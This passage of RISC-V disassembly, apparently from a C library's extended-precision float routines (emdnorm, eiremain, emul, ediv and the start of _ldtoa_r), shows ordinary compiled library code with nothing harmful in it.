   1346e:	c858                	sw	a4,20(s0)
   13470:	6705                	lui	a4,0x1
   13472:	8007071b          	addiw	a4,a4,-2048
   13476:	b7d5                	j	1345a <emdnorm+0x1b2>
   13478:	00800737          	lui	a4,0x800
   1347c:	0ff7071b          	addiw	a4,a4,255
   13480:	c858                	sw	a4,20(s0)
   13482:	10000713          	li	a4,256
   13486:	00e41c23          	sh	a4,24(s0)
   1348a:	4711                	li	a4,4
   1348c:	1702                	slli	a4,a4,0x20
   1348e:	0711                	addi	a4,a4,4
   13490:	b5f1                	j	1335c <emdnorm+0xb4>
   13492:	0007d503          	lhu	a0,0(a5)
   13496:	c119                	beqz	a0,1349c <emdnorm+0x1f4>
   13498:	00176713          	ori	a4,a4,1
   1349c:	00079023          	sh	zero,0(a5)
   134a0:	2685                	addiw	a3,a3,1
   134a2:	0789                	addi	a5,a5,2
   134a4:	bf01                	j	133b4 <emdnorm+0x10c>
   134a6:	f40a04e3          	beqz	s4,133ee <emdnorm+0x146>
   134aa:	01204a63          	bgtz	s2,134be <emdnorm+0x216>
   134ae:	4058                	lw	a4,4(s0)
   134b0:	09000793          	li	a5,144
   134b4:	00f70563          	beq	a4,a5,134be <emdnorm+0x216>
   134b8:	8526                	mv	a0,s1
   134ba:	ffcff0ef          	jal	ra,12cb6 <eshup1>
   134be:	0044d783          	lhu	a5,4(s1)
   134c2:	c789                	beqz	a5,134cc <emdnorm+0x224>
   134c4:	8526                	mv	a0,s1
   134c6:	fb8ff0ef          	jal	ra,12c7e <eshdn1>
   134ca:	0905                	addi	s2,s2,1
   134cc:	67a1                	lui	a5,0x8
   134ce:	00049c23          	sh	zero,24(s1)
   134d2:	17f9                	addi	a5,a5,-2
   134d4:	0327d063          	ble	s2,a5,134f4 <emdnorm+0x24c>
   134d8:	77e1                	lui	a5,0xffff8
   134da:	fff7c793          	not	a5,a5
   134de:	00f49123          	sh	a5,2(s1)
   134e2:	00448793          	addi	a5,s1,4
   134e6:	04e1                	addi	s1,s1,24
   134e8:	00079023          	sh	zero,0(a5) # ffffffffffff8000 <_end+0xffffffffffdc74d8>
   134ec:	0789                	addi	a5,a5,2
   134ee:	fef49de3          	bne	s1,a5,134e8 <emdnorm+0x240>
   134f2:	bbed                	j	132ec <emdnorm+0x44>
   134f4:	00095563          	bgez	s2,134fe <emdnorm+0x256>
   134f8:	00049123          	sh	zero,2(s1)
   134fc:	bbc5                	j	132ec <emdnorm+0x44>
   134fe:	01249123          	sh	s2,2(s1)
   13502:	b3ed                	j	132ec <emdnorm+0x44>
   13504:	e00a9ce3          	bnez	s5,1331c <emdnorm+0x74>
   13508:	00049c23          	sh	zero,24(s1)
   1350c:	b7f1                	j	134d8 <emdnorm+0x230>

000000000001350e <eiremain>:
   1350e:	7139                	addi	sp,sp,-64
   13510:	e852                	sd	s4,16(sp)
   13512:	00255a03          	lhu	s4,2(a0)
   13516:	f822                	sd	s0,48(sp)
   13518:	842e                	mv	s0,a1
   1351a:	fc06                	sd	ra,56(sp)
   1351c:	f426                	sd	s1,40(sp)
   1351e:	f04a                	sd	s2,32(sp)
   13520:	e456                	sd	s5,8(sp)
   13522:	e05a                	sd	s6,0(sp)
   13524:	8932                	mv	s2,a2
   13526:	03460b13          	addi	s6,a2,52
   1352a:	ec4e                	sd	s3,24(sp)
   1352c:	8aaa                	mv	s5,a0
   1352e:	bb9ff0ef          	jal	ra,130e6 <enormlz>
   13532:	00245483          	lhu	s1,2(s0)
   13536:	40aa0a33          	sub	s4,s4,a0
   1353a:	8522                	mv	a0,s0
   1353c:	babff0ef          	jal	ra,130e6 <enormlz>
   13540:	8c89                	sub	s1,s1,a0
   13542:	855a                	mv	a0,s6
   13544:	ee4ff0ef          	jal	ra,12c28 <ecleaz>
   13548:	0344d363          	ble	s4,s1,1356e <eiremain+0x60>
   1354c:	8522                	mv	a0,s0
   1354e:	7442                	ld	s0,48(sp)
   13550:	70e2                	ld	ra,56(sp)
   13552:	69e2                	ld	s3,24(sp)
   13554:	6a42                	ld	s4,16(sp)
   13556:	6aa2                	ld	s5,8(sp)
   13558:	6b02                	ld	s6,0(sp)
   1355a:	87ca                	mv	a5,s2
   1355c:	86a6                	mv	a3,s1
   1355e:	7902                	ld	s2,32(sp)
   13560:	74a2                	ld	s1,40(sp)
   13562:	4701                	li	a4,0
   13564:	4601                	li	a2,0
   13566:	4581                	li	a1,0
   13568:	6121                	addi	sp,sp,64
   1356a:	d3fff06f          	j	132a8 <emdnorm>
   1356e:	85a2                	mv	a1,s0
   13570:	8556                	mv	a0,s5
   13572:	ee2ff0ef          	jal	ra,12c54 <ecmpm>
   13576:	4981                	li	s3,0
   13578:	00a04763          	bgtz	a0,13586 <eiremain+0x78>
   1357c:	85a2                	mv	a1,s0
   1357e:	8556                	mv	a0,s5
   13580:	825ff0ef          	jal	ra,12da4 <esubm>
   13584:	4985                	li	s3,1
   13586:	855a                	mv	a0,s6
   13588:	f2eff0ef          	jal	ra,12cb6 <eshup1>
   1358c:	04c95783          	lhu	a5,76(s2)
   13590:	8522                	mv	a0,s0
   13592:	14fd                	addi	s1,s1,-1
   13594:	00f9e9b3          	or	s3,s3,a5
   13598:	05391623          	sh	s3,76(s2)
   1359c:	f1aff0ef          	jal	ra,12cb6 <eshup1>
   135a0:	b765                	j	13548 <eiremain+0x3a>

00000000000135a2 <emul>:
   135a2:	7131                	addi	sp,sp,-192
   135a4:	f922                	sd	s0,176(sp)
   135a6:	f526                	sd	s1,168(sp)
   135a8:	f14a                	sd	s2,160(sp)
   135aa:	ed4e                	sd	s3,152(sp)
   135ac:	fd06                	sd	ra,184(sp)
   135ae:	e952                	sd	s4,144(sp)
   135b0:	e556                	sd	s5,136(sp)
   135b2:	e15a                	sd	s6,128(sp)
   135b4:	fcde                	sd	s7,120(sp)
   135b6:	f8e2                	sd	s8,112(sp)
   135b8:	f4e6                	sd	s9,104(sp)
   135ba:	84aa                	mv	s1,a0
   135bc:	842e                	mv	s0,a1
   135be:	8932                	mv	s2,a2
   135c0:	89b6                	mv	s3,a3
   135c2:	87fff0ef          	jal	ra,12e40 <eisnan>
   135c6:	c115                	beqz	a0,135ea <emul+0x48>
   135c8:	85ca                	mv	a1,s2
   135ca:	8526                	mv	a0,s1
   135cc:	e46ff0ef          	jal	ra,12c12 <emov>
   135d0:	70ea                	ld	ra,184(sp)
   135d2:	744a                	ld	s0,176(sp)
   135d4:	74aa                	ld	s1,168(sp)
   135d6:	790a                	ld	s2,160(sp)
   135d8:	69ea                	ld	s3,152(sp)
   135da:	6a4a                	ld	s4,144(sp)
   135dc:	6aaa                	ld	s5,136(sp)
   135de:	6b0a                	ld	s6,128(sp)
   135e0:	7be6                	ld	s7,120(sp)
   135e2:	7c46                	ld	s8,112(sp)
   135e4:	7ca6                	ld	s9,104(sp)
   135e6:	6129                	addi	sp,sp,192
   135e8:	8082                	ret
   135ea:	8522                	mv	a0,s0
   135ec:	855ff0ef          	jal	ra,12e40 <eisnan>
   135f0:	c501                	beqz	a0,135f8 <emul+0x56>
   135f2:	85ca                	mv	a1,s2
   135f4:	8522                	mv	a0,s0
   135f6:	bfd9                	j	135cc <emul+0x2a>
   135f8:	8526                	mv	a0,s1
   135fa:	9cbff0ef          	jal	ra,12fc4 <eisinf>
   135fe:	e521                	bnez	a0,13646 <emul+0xa4>
   13600:	8522                	mv	a0,s0
   13602:	9c3ff0ef          	jal	ra,12fc4 <eisinf>
   13606:	c901                	beqz	a0,13616 <emul+0x74>
   13608:	65e9                	lui	a1,0x1a
   1360a:	4c858593          	addi	a1,a1,1224 # 1a4c8 <ezero>
   1360e:	8526                	mv	a0,s1
   13610:	911ff0ef          	jal	ra,12f20 <ecmp>
   13614:	c121                	beqz	a0,13654 <emul+0xb2>
   13616:	8526                	mv	a0,s1
   13618:	9adff0ef          	jal	ra,12fc4 <eisinf>
   1361c:	e509                	bnez	a0,13626 <emul+0x84>
   1361e:	8522                	mv	a0,s0
   13620:	9a5ff0ef          	jal	ra,12fc4 <eisinf>
   13624:	cd1d                	beqz	a0,13662 <emul+0xc0>
   13626:	8526                	mv	a0,s1
   13628:	83fff0ef          	jal	ra,12e66 <eisneg>
   1362c:	84aa                	mv	s1,a0
   1362e:	8522                	mv	a0,s0
   13630:	837ff0ef          	jal	ra,12e66 <eisneg>
   13634:	02a48463          	beq	s1,a0,1365c <emul+0xba>
   13638:	77e1                	lui	a5,0xffff8
   1363a:	00f91923          	sh	a5,18(s2)
   1363e:	854a                	mv	a0,s2
   13640:	9a9ff0ef          	jal	ra,12fe8 <einfin.isra.2>
   13644:	b771                	j	135d0 <emul+0x2e>
   13646:	65e9                	lui	a1,0x1a
   13648:	4c858593          	addi	a1,a1,1224 # 1a4c8 <ezero>
   1364c:	8522                	mv	a0,s0
   1364e:	8d3ff0ef          	jal	ra,12f20 <ecmp>
   13652:	f55d                	bnez	a0,13600 <emul+0x5e>
   13654:	854a                	mv	a0,s2
   13656:	b27ff0ef          	jal	ra,1317c <enan.constprop.12>
   1365a:	bf9d                	j	135d0 <emul+0x2e>
   1365c:	00091923          	sh	zero,18(s2)
   13660:	bff9                	j	1363e <emul+0x9c>
   13662:	8526                	mv	a0,s1
   13664:	858a                	mv	a1,sp
   13666:	821ff0ef          	jal	ra,12e86 <emovi>
   1366a:	8522                	mv	a0,s0
   1366c:	100c                	addi	a1,sp,32
   1366e:	819ff0ef          	jal	ra,12e86 <emovi>
   13672:	00215403          	lhu	s0,2(sp)
   13676:	02215483          	lhu	s1,34(sp)
   1367a:	ec09                	bnez	s0,13694 <emul+0xf2>
   1367c:	4781                	li	a5,0
   1367e:	4759                	li	a4,22
   13680:	00f106b3          	add	a3,sp,a5
   13684:	0026d683          	lhu	a3,2(a3)
   13688:	c6e9                	beqz	a3,13752 <emul+0x1b0>
   1368a:	850a                	mv	a0,sp
   1368c:	a5bff0ef          	jal	ra,130e6 <enormlz>
   13690:	40a00433          	neg	s0,a0
   13694:	02215783          	lhu	a5,34(sp)
   13698:	8c26                	mv	s8,s1
   1369a:	ef81                	bnez	a5,136b2 <emul+0x110>
   1369c:	4759                	li	a4,22
   1369e:	1014                	addi	a3,sp,32
   136a0:	96be                	add	a3,a3,a5
   136a2:	0026d683          	lhu	a3,2(a3)
   136a6:	cecd                	beqz	a3,13760 <emul+0x1be>
   136a8:	1008                	addi	a0,sp,32
   136aa:	a3dff0ef          	jal	ra,130e6 <enormlz>
   136ae:	40a48c33          	sub	s8,s1,a0
   136b2:	02015783          	lhu	a5,32(sp)
   136b6:	03498b93          	addi	s7,s3,52
   136ba:	03898493          	addi	s1,s3,56
   136be:	02f99a23          	sh	a5,52(s3)
   136c2:	02215783          	lhu	a5,34(sp)
   136c6:	8a5e                	mv	s4,s7
   136c8:	02f99b23          	sh	a5,54(s3)
   136cc:	04e98793          	addi	a5,s3,78
   136d0:	00049023          	sh	zero,0(s1)
   136d4:	0489                	addi	s1,s1,2
   136d6:	fe979de3          	bne	a5,s1,136d0 <emul+0x12e>
   136da:	4a81                	li	s5,0
   136dc:	4b01                	li	s6,0
   136de:	5cb1                	li	s9,-20
   136e0:	015107b3          	add	a5,sp,s5
   136e4:	0187d503          	lhu	a0,24(a5) # ffffffffffff8018 <_end+0xffffffffffdc74f0>
   136e8:	c909                	beqz	a0,136fa <emul+0x158>
   136ea:	100c                	addi	a1,sp,32
   136ec:	0090                	addi	a2,sp,64
   136ee:	edeff0ef          	jal	ra,12dcc <m16m>
   136f2:	85de                	mv	a1,s7
   136f4:	0088                	addi	a0,sp,64
   136f6:	e86ff0ef          	jal	ra,12d7c <eaddm>
   136fa:	04c9d783          	lhu	a5,76(s3)
   136fe:	855e                	mv	a0,s7
   13700:	1af9                	addi	s5,s5,-2
   13702:	00fb6b33          	or	s6,s6,a5
   13706:	e54ff0ef          	jal	ra,12d5a <eshdn6>
   1370a:	fd9a9be3          	bne	s5,s9,136e0 <emul+0x13e>
   1370e:	101c                	addi	a5,sp,32
   13710:	000a5703          	lhu	a4,0(s4)
   13714:	0a09                	addi	s4,s4,2
   13716:	0789                	addi	a5,a5,2
   13718:	fee79f23          	sh	a4,-2(a5)
   1371c:	fe9a1ae3          	bne	s4,s1,13710 <emul+0x16e>
   13720:	76f1                	lui	a3,0xffffc
   13722:	9462                	add	s0,s0,s8
   13724:	0689                	addi	a3,a3,2
   13726:	87ce                	mv	a5,s3
   13728:	04000713          	li	a4,64
   1372c:	96a2                	add	a3,a3,s0
   1372e:	4601                	li	a2,0
   13730:	85da                	mv	a1,s6
   13732:	1008                	addi	a0,sp,32
   13734:	b75ff0ef          	jal	ra,132a8 <emdnorm>
   13738:	00015703          	lhu	a4,0(sp)
   1373c:	02015783          	lhu	a5,32(sp)
   13740:	02f71463          	bne	a4,a5,13768 <emul+0x1c6>
   13744:	02011023          	sh	zero,32(sp)
   13748:	85ca                	mv	a1,s2
   1374a:	1008                	addi	a0,sp,32
   1374c:	a51ff0ef          	jal	ra,1319c <emovo.isra.6>
   13750:	b541                	j	135d0 <emul+0x2e>
   13752:	0789                	addi	a5,a5,2
   13754:	f2e796e3          	bne	a5,a4,13680 <emul+0xde>
   13758:	854a                	mv	a0,s2
   1375a:	ca8ff0ef          	jal	ra,12c02 <eclear>
   1375e:	bd8d                	j	135d0 <emul+0x2e>
   13760:	0789                	addi	a5,a5,2
   13762:	f2e79ee3          	bne	a5,a4,1369e <emul+0xfc>
   13766:	bfcd                	j	13758 <emul+0x1b6>
   13768:	57fd                	li	a5,-1
   1376a:	02f11023          	sh	a5,32(sp)
   1376e:	bfe9                	j	13748 <emul+0x1a6>

0000000000013770 <ediv>:
   13770:	7131                	addi	sp,sp,-192
   13772:	f922                	sd	s0,176(sp)
   13774:	f526                	sd	s1,168(sp)
   13776:	f14a                	sd	s2,160(sp)
   13778:	e556                	sd	s5,136(sp)
   1377a:	fd06                	sd	ra,184(sp)
   1377c:	ed4e                	sd	s3,152(sp)
   1377e:	e952                	sd	s4,144(sp)
   13780:	e15a                	sd	s6,128(sp)
   13782:	fcde                	sd	s7,120(sp)
   13784:	f8e2                	sd	s8,112(sp)
   13786:	f4e6                	sd	s9,104(sp)
   13788:	f0ea                	sd	s10,96(sp)
   1378a:	84aa                	mv	s1,a0
   1378c:	842e                	mv	s0,a1
   1378e:	8932                	mv	s2,a2
   13790:	8ab6                	mv	s5,a3
   13792:	eaeff0ef          	jal	ra,12e40 <eisnan>
   13796:	c11d                	beqz	a0,137bc <ediv+0x4c>
   13798:	85ca                	mv	a1,s2
   1379a:	8526                	mv	a0,s1
   1379c:	c76ff0ef          	jal	ra,12c12 <emov>
   137a0:	70ea                	ld	ra,184(sp)
   137a2:	744a                	ld	s0,176(sp)
   137a4:	74aa                	ld	s1,168(sp)
   137a6:	790a                	ld	s2,160(sp)
   137a8:	69ea                	ld	s3,152(sp)
   137aa:	6a4a                	ld	s4,144(sp)
   137ac:	6aaa                	ld	s5,136(sp)
   137ae:	6b0a                	ld	s6,128(sp)
   137b0:	7be6                	ld	s7,120(sp)
   137b2:	7c46                	ld	s8,112(sp)
   137b4:	7ca6                	ld	s9,104(sp)
   137b6:	7d06                	ld	s10,96(sp)
   137b8:	6129                	addi	sp,sp,192
   137ba:	8082                	ret
   137bc:	8522                	mv	a0,s0
   137be:	e82ff0ef          	jal	ra,12e40 <eisnan>
   137c2:	c501                	beqz	a0,137ca <ediv+0x5a>
   137c4:	85ca                	mv	a1,s2
   137c6:	8522                	mv	a0,s0
   137c8:	bfd1                	j	1379c <ediv+0x2c>
   137ca:	69e9                	lui	s3,0x1a
   137cc:	4c898593          	addi	a1,s3,1224 # 1a4c8 <ezero>
   137d0:	8526                	mv	a0,s1
   137d2:	f4eff0ef          	jal	ra,12f20 <ecmp>
   137d6:	16050763          	beqz	a0,13944 <ediv+0x1d4>
   137da:	8526                	mv	a0,s1
   137dc:	fe8ff0ef          	jal	ra,12fc4 <eisinf>
   137e0:	89aa                	mv	s3,a0
   137e2:	8522                	mv	a0,s0
   137e4:	fe0ff0ef          	jal	ra,12fc4 <eisinf>
   137e8:	16099963          	bnez	s3,1395a <ediv+0x1ea>
   137ec:	16051c63          	bnez	a0,13964 <ediv+0x1f4>
   137f0:	8526                	mv	a0,s1
   137f2:	858a                	mv	a1,sp
   137f4:	e92ff0ef          	jal	ra,12e86 <emovi>
   137f8:	8522                	mv	a0,s0
   137fa:	100c                	addi	a1,sp,32
   137fc:	e8aff0ef          	jal	ra,12e86 <emovi>
   13800:	02215483          	lhu	s1,34(sp)
   13804:	00215403          	lhu	s0,2(sp)
   13808:	ec91                	bnez	s1,13824 <ediv+0xb4>
   1380a:	4781                	li	a5,0
   1380c:	4759                	li	a4,22
   1380e:	1014                	addi	a3,sp,32
   13810:	96be                	add	a3,a3,a5
   13812:	0026d683          	lhu	a3,2(a3) # ffffffffffffc002 <_end+0xffffffffffdcb4da>
   13816:	16068763          	beqz	a3,13984 <ediv+0x214>
   1381a:	1008                	addi	a0,sp,32
   1381c:	8cbff0ef          	jal	ra,130e6 <enormlz>
   13820:	40a004b3          	neg	s1,a0
   13824:	00215783          	lhu	a5,2(sp)
   13828:	8ba2                	mv	s7,s0
   1382a:	ef89                	bnez	a5,13844 <ediv+0xd4>
   1382c:	4759                	li	a4,22
   1382e:	00f106b3          	add	a3,sp,a5
   13832:	0026d683          	lhu	a3,2(a3)
   13836:	14068b63          	beqz	a3,1398c <ediv+0x21c>
   1383a:	850a                	mv	a0,sp
   1383c:	8abff0ef          	jal	ra,130e6 <enormlz>
   13840:	40a40bb3          	sub	s7,s0,a0
   13844:	02015783          	lhu	a5,32(sp)
   13848:	02215703          	lhu	a4,34(sp)
   1384c:	034a8993          	addi	s3,s5,52
   13850:	02fa9a23          	sh	a5,52(s5)
   13854:	038a8793          	addi	a5,s5,56
   13858:	02ea9b23          	sh	a4,54(s5)
   1385c:	8a3e                	mv	s4,a5
   1385e:	04ea8713          	addi	a4,s5,78
   13862:	0789                	addi	a5,a5,2
   13864:	fe079f23          	sh	zero,-2(a5)
   13868:	fee79de3          	bne	a5,a4,13862 <ediv+0xf2>
   1386c:	1008                	addi	a0,sp,32
   1386e:	c10ff0ef          	jal	ra,12c7e <eshdn1>
   13872:	00615c03          	lhu	s8,6(sp)
   13876:	6b41                	lui	s6,0x10
   13878:	1b7d                	addi	s6,s6,-1
   1387a:	036c0d33          	mul	s10,s8,s6
   1387e:	01a98c93          	addi	s9,s3,26
   13882:	02415783          	lhu	a5,36(sp)
   13886:	02615403          	lhu	s0,38(sp)
   1388a:	07c2                	slli	a5,a5,0x10
   1388c:	97a2                	add	a5,a5,s0
   1388e:	845a                	mv	s0,s6
   13890:	00fd6663          	bltu	s10,a5,1389c <ediv+0x12c>
   13894:	0387d433          	divu	s0,a5,s8
   13898:	1442                	slli	s0,s0,0x30
   1389a:	9041                	srli	s0,s0,0x30
   1389c:	858a                	mv	a1,sp
   1389e:	8522                	mv	a0,s0
   138a0:	0090                	addi	a2,sp,64
   138a2:	d2aff0ef          	jal	ra,12dcc <m16m>
   138a6:	100c                	addi	a1,sp,32
   138a8:	0088                	addi	a0,sp,64
   138aa:	baaff0ef          	jal	ra,12c54 <ecmpm>
   138ae:	00a05f63          	blez	a0,138cc <ediv+0x15c>
   138b2:	008c                	addi	a1,sp,64
   138b4:	850a                	mv	a0,sp
   138b6:	ceeff0ef          	jal	ra,12da4 <esubm>
   138ba:	100c                	addi	a1,sp,32
   138bc:	0088                	addi	a0,sp,64
   138be:	b96ff0ef          	jal	ra,12c54 <ecmpm>
   138c2:	0ea04163          	bgtz	a0,139a4 <ediv+0x234>
   138c6:	347d                	addiw	s0,s0,-1
   138c8:	1442                	slli	s0,s0,0x30
   138ca:	9041                	srli	s0,s0,0x30
   138cc:	100c                	addi	a1,sp,32
   138ce:	0088                	addi	a0,sp,64
   138d0:	cd4ff0ef          	jal	ra,12da4 <esubm>
   138d4:	1008                	addi	a0,sp,32
   138d6:	008a1023          	sh	s0,0(s4)
   138da:	0a09                	addi	s4,s4,2
   138dc:	c62ff0ef          	jal	ra,12d3e <eshup6>
   138e0:	fb9a11e3          	bne	s4,s9,13882 <ediv+0x112>
   138e4:	4781                	li	a5,0
   138e6:	4581                	li	a1,0
   138e8:	4759                	li	a4,22
   138ea:	1014                	addi	a3,sp,32
   138ec:	96be                	add	a3,a3,a5
   138ee:	0046d683          	lhu	a3,4(a3)
   138f2:	0789                	addi	a5,a5,2
   138f4:	8dd5                	or	a1,a1,a3
   138f6:	fee79ae3          	bne	a5,a4,138ea <ediv+0x17a>
   138fa:	2581                	sext.w	a1,a1
   138fc:	00b035b3          	snez	a1,a1
   13900:	101c                	addi	a5,sp,32
   13902:	0009d703          	lhu	a4,0(s3)
   13906:	0989                	addi	s3,s3,2
   13908:	0789                	addi	a5,a5,2
   1390a:	fee79f23          	sh	a4,-2(a5)
   1390e:	ff3a1ae3          	bne	s4,s3,13902 <ediv+0x192>
   13912:	6691                	lui	a3,0x4
   13914:	417484b3          	sub	s1,s1,s7
   13918:	16fd                	addi	a3,a3,-1
   1391a:	87d6                	mv	a5,s5
   1391c:	04000713          	li	a4,64
   13920:	96a6                	add	a3,a3,s1
   13922:	4601                	li	a2,0
   13924:	1008                	addi	a0,sp,32
   13926:	983ff0ef          	jal	ra,132a8 <emdnorm>
   1392a:	00015703          	lhu	a4,0(sp)
   1392e:	02015783          	lhu	a5,32(sp)
   13932:	08f71163          	bne	a4,a5,139b4 <ediv+0x244>
   13936:	02011023          	sh	zero,32(sp)
   1393a:	85ca                	mv	a1,s2
   1393c:	1008                	addi	a0,sp,32
   1393e:	85fff0ef          	jal	ra,1319c <emovo.isra.6>
   13942:	bdb9                	j	137a0 <ediv+0x30>
   13944:	4c898593          	addi	a1,s3,1224
   13948:	8522                	mv	a0,s0
   1394a:	dd6ff0ef          	jal	ra,12f20 <ecmp>
   1394e:	e80516e3          	bnez	a0,137da <ediv+0x6a>
   13952:	854a                	mv	a0,s2
   13954:	829ff0ef          	jal	ra,1317c <enan.constprop.12>
   13958:	b5a1                	j	137a0 <ediv+0x30>
   1395a:	fd65                	bnez	a0,13952 <ediv+0x1e2>
   1395c:	854a                	mv	a0,s2
   1395e:	aa4ff0ef          	jal	ra,12c02 <eclear>
   13962:	bd3d                	j	137a0 <ediv+0x30>
   13964:	8526                	mv	a0,s1
   13966:	d00ff0ef          	jal	ra,12e66 <eisneg>
   1396a:	84aa                	mv	s1,a0
   1396c:	8522                	mv	a0,s0
   1396e:	cf8ff0ef          	jal	ra,12e66 <eisneg>
   13972:	02a48663          	beq	s1,a0,1399e <ediv+0x22e>
   13976:	77e1                	lui	a5,0xffff8
   13978:	00f91923          	sh	a5,18(s2)
   1397c:	854a                	mv	a0,s2
   1397e:	e6aff0ef          	jal	ra,12fe8 <einfin.isra.2>
   13982:	bd39                	j	137a0 <ediv+0x30>
   13984:	0789                	addi	a5,a5,2
   13986:	e8e794e3          	bne	a5,a4,1380e <ediv+0x9e>
   1398a:	bfc9                	j	1395c <ediv+0x1ec>
   1398c:	0789                	addi	a5,a5,2
   1398e:	eae790e3          	bne	a5,a4,1382e <ediv+0xbe>
   13992:	00015703          	lhu	a4,0(sp)
   13996:	02015783          	lhu	a5,32(sp)
   1399a:	fcf71ee3          	bne	a4,a5,13976 <ediv+0x206>
   1399e:	00091923          	sh	zero,18(s2)
   139a2:	bfe9                	j	1397c <ediv+0x20c>
   139a4:	3479                	addiw	s0,s0,-2
   139a6:	1442                	slli	s0,s0,0x30
   139a8:	008c                	addi	a1,sp,64
   139aa:	850a                	mv	a0,sp
   139ac:	9041                	srli	s0,s0,0x30
   139ae:	bf6ff0ef          	jal	ra,12da4 <esubm>
   139b2:	bf29                	j	138cc <ediv+0x15c>
   139b4:	57fd                	li	a5,-1
   139b6:	02f11023          	sh	a5,32(sp)
   139ba:	b741                	j	1393a <ediv+0x1ca>

00000000000139bc <_ldtoa_r>:
   139bc:	db010113          	addi	sp,sp,-592
   139c0:	ffe6                	sd	s9,504(sp)
   139c2:	8cbe                	mv	s9,a5
   139c4:	09100793          	li	a5,145
   139c8:	e0ae                	sd	a1,64(sp)
   139ca:	1782                	slli	a5,a5,0x20
   139cc:	712c                	ld	a1,96(a0)
   139ce:	17fd                	addi	a5,a5,-1
   139d0:	24813023          	sd	s0,576(sp)
   139d4:	23413023          	sd	s4,544(sp)
   139d8:	21513c23          	sd	s5,536(sp)
   139dc:	21713423          	sd	s7,520(sp)
   139e0:	24113423          	sd	ra,584(sp)
   139e4:	22913c23          	sd	s1,568(sp)
   139e8:	23213823          	sd	s2,560(sp)
   139ec:	23313423          	sd	s3,552(sp)
   139f0:	21613823          	sd	s6,528(sp)
   139f4:	21813023          	sd	s8,512(sp)
   139f8:	fbea                	sd	s10,496(sp)
   139fa:	f7ee                	sd	s11,488(sp)
   139fc:	ec46                	sd	a7,24(sp)
   139fe:	e4b2                	sd	a2,72(sp)
   13a00:	eb3e                	sd	a5,400(sp)
   13a02:	8a2a                	mv	s4,a0
   13a04:	8bb6                	mv	s7,a3
   13a06:	8aba                	mv	s5,a4
   13a08:	8442                	mv	s0,a6
   13a0a:	c999                	beqz	a1,13a20 <_ldtoa_r+0x64>
   13a0c:	5538                	lw	a4,104(a0)
   13a0e:	4785                	li	a5,1
   13a10:	00e797bb          	sllw	a5,a5,a4
   13a14:	c598                	sw	a4,8(a1)
   13a16:	c5dc                	sw	a5,12(a1)
   13a18:	156010ef          	jal	ra,14b6e <_Bfree>
   13a1c:	060a3023          	sd	zero,96(s4)
   13a20:	0088                	addi	a0,sp,64
   13a22:	188c                	addi	a1,sp,112
   13a24:	fcaff0ef          	jal	ra,131ee <e113toe.isra.8>
   13a28:	1888                	addi	a0,sp,112
   13a2a:	c3cff0ef          	jal	ra,12e66 <eisneg>
   13a2e:	cd4d                	beqz	a0,13ae8 <_ldtoa_r+0x12c>
   13a30:	4785                	li	a5,1
   13a32:	c01c                	sw	a5,0(s0)
   13a34:	478d                	li	a5,3
   13a36:	0afb8c63          	beq	s7,a5,13aee <_ldtoa_r+0x132>
   13a3a:	4951                	li	s2,20
   13a3c:	000b8c63          	beqz	s7,13a54 <_ldtoa_r+0x98>
   13a40:	fffa879b          	addiw	a5,s5,-1
   13a44:	02a00713          	li	a4,42
   13a48:	0007891b          	sext.w	s2,a5
   13a4c:	00f75463          	ble	a5,a4,13a54 <_ldtoa_r+0x98>
   13a50:	02a00913          	li	s2,42
   13a54:	19412783          	lw	a5,404(sp)
   13a58:	1888                	addi	a0,sp,112
   13a5a:	f03e                	sd	a5,32(sp)
   13a5c:	be4ff0ef          	jal	ra,12e40 <eisnan>
   13a60:	842a                	mv	s0,a0
   13a62:	c941                	beqz	a0,13af2 <_ldtoa_r+0x136>
   13a64:	0001a5b7          	lui	a1,0x1a
   13a68:	73058593          	addi	a1,a1,1840 # 1a730 <emtens+0x108>
   13a6c:	0a88                	addi	a0,sp,336
   13a6e:	6409                	lui	s0,0x2
   13a70:	763010ef          	jal	ra,159d2 <sprintf>
